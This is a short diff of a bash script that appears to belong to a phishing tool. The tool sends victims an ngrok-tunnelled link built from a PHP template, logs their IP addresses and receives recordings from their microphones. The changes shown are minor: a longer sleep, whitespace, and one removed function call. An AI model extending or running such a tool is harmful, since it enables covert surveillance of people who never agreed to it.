@@ -55,7 +55,7 @@ rm -rf ip.txt
 
 fi
 
-sleep 0.12
+sleep 0.5
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
@@ -313,6 +313,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
 }
+
 start3() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -337,11 +338,8 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not instal
 start4
 
 elif [[ $option_server -eq 2 ]]; then
-
-		ngrok_server1
-		checkfound5
-
-
+ngrok_server1
+		
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
